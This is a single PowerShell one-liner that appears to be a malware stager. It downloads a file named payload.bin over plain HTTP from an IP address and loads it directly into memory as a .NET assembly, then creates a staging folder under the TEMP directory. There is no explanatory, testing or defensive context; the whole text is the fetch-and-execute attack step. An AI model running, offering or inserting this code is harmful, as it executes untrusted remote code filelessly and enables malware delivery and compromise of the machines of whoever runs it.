
$StageBytes = (New-Object System.Net.WebClient).DownloadData("http://192.0.2.107/payload.bin"); [Reflection.Assembly]::Load($StageBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
